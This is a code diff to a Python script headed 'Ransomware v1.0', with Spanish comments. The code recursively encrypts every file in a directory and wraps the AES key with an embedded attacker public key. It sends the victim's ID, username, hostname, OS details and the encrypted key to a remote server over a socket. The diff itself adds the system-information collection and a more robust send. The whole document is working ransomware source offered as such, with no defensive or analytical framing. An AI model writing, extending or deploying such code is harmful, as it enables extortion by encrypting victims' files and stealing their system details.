@@ -8,6 +8,9 @@ import hashlib
 from getmac import get_mac_address
 import base64
 import json
+import platform
+import getpass
+import socket
 
 # Ransomware v1.0
 ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
@@ -80,33 +83,55 @@ def encrypt_aes_key_with_ecies(aes_key, attacker_public_key):
 def ransomware(directory_path, client):
     try:
         victim_id = hashlib.sha256(get_mac_address().encode()).hexdigest()
-        aes_key = generate_aes_key()
+        username = getpass.getuser()
+        hostname = socket.gethostname()
+        os_info = f"{platform.system()} {platform.release()}"
 
-        encrypted_files = 0
-        for root, _, files in os.walk(directory_path):
-            for file_name in files:
-                file_path = os.path.join(root, file_name)
-                if encrypt_file(file_path, aes_key):
-                    encrypted_files += 1
-        print(f"[*] Archivos encriptados")
-
-        
-        encrypted_aes_key, ephemeral_public_key = encrypt_aes_key_with_ecies(aes_key, ATTACKER_PUBLIC_KEY)
-        if not encrypted_aes_key or not ephemeral_public_key:
-            print("[!] Fallo al encriptar la clave AES")
-            return
-        
-        #Envio del ID y las llaves al servidor en formato JSON
+        # Siempre recopila la información básica del sistema
         data = {
+            "type": "initial_info", # Nuevo campo para identificar el tipo de mensaje
             "victim_id": victim_id,
-            "encrypted_key": base64.b64encode(encrypted_aes_key).decode('utf-8'),
-            "ephemeral_public_key": base64.b64encode(ephemeral_public_key).decode('utf-8')
+            "username": username,
+            "hostname": hostname,
+            "os_info": os_info,
+            "encrypted_key": None, # Se establece a None inicialmente
+            "ephemeral_public_key": None
         }
-        client.send(json.dumps(data).encode("utf-8") + b"\n")
-        print("[*] Informacion encriptada enviada al servidor")
-    except Exception as e:
-        print(f"[!] Error: {e}")
+
+        aes_key = generate_aes_key()
+        encrypted_files_count = 0
+
+        # Intenta encriptar los archivos
         try:
-            client.send(f"[!] Error: {e}\n".encode("utf-8"))
-        except:
-            pass
+            for root, _, files in os.walk(directory_path):
+                for file_name in files:
+                    file_path = os.path.join(root, file_name)
+                    if encrypt_file(file_path, aes_key):
+                        encrypted_files_count += 1
+            print(f"[*] Archivos encriptados: {encrypted_files_count}")
+
+            encrypted_aes_key, ephemeral_public_key = encrypt_aes_key_with_ecies(aes_key, ATTACKER_PUBLIC_KEY)
+            if encrypted_aes_key and ephemeral_public_key:
+                data["encrypted_key"] = base64.b64encode(encrypted_aes_key).decode('utf-8')
+                data["ephemeral_public_key"] = base64.b64encode(ephemeral_public_key).decode('utf-8')
+                print("[*] Clave AES encriptada y clave pública efímera generadas.")
+            else:
+                print("[!] Fallo al encriptar la clave AES. La clave no se enviará.")
+
+        except Exception as e:
+            print(f"[!] Error durante la encriptación de archivos o generación de claves: {e}")
+            # Si ocurre un error aquí, la información básica del sistema aún puede enviarse
+
+        # Envía la información recopilada al servidor
+        try:
+            client.sendall(json.dumps(data).encode("utf-8") + b"\n") # Usar sendall para asegurar que se envía todo
+            print("[*] Información inicial del equipo y clave (si disponible) enviada al servidor.")
+        except Exception as e:
+            print(f"[!] Error al enviar los datos JSON al servidor: {e}")
+
+        return data # Devuelve la información enviada
+
+    except Exception as e:
+        print(f"[!] Error general en la función ransomware: {e}")
+        # Aquí podrías considerar enviar un mensaje de error básico al servidor si la conexión sigue activa
+        return None
